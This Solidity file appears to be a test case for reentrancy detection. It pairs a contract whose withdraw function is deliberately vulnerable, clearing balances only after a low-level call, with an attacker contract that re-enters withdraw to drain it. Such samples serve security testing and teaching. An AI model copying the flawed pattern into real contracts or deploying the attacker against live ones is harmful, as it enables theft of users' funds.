// SPDX-License-Identifier: GPL-3.0
pragma solidity ^0.8.0;
import '../../../../../interfaces/single-function/ILowLevelCallToSender.sol';

contract CallGasRee1 is ILowLevelCallToSender {
    mapping (address => uint256) public balances;

    function withdraw() public {
        uint256 amt = balances[msg.sender];
        require(amt > 0, "Insufficient funds");
        (bool success, ) = msg.sender.call{value:amt, gas:23000}("");    // the only way to make this vulnerable 
        require(success, "Call failed");
        balances[msg.sender] = 0;   // side effect AFTER external call makes this unsafe because the attacker has enough gas to re-enter
    }

    function deposit() public payable {
        balances[msg.sender] += msg.value;       
    }

}

contract CallGasReeAttacker {
    ILowLevelCallToSender public c;
    address public owner;

    constructor(address _c) {
        c = ILowLevelCallToSender(_c);
        owner = msg.sender;
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether to attack");
        c.deposit{value: 1 ether}();
        c.withdraw();
    }

    function collectEther() public {
        require(msg.sender == owner, "Only owner can collect Ether");
        payable(owner).transfer(address(this).balance);
    }

    // Allow contract to receive Ether
    receive() external payable {
        if (address(c).balance >= 1 ether) {
            c.withdraw();
        }
    }
}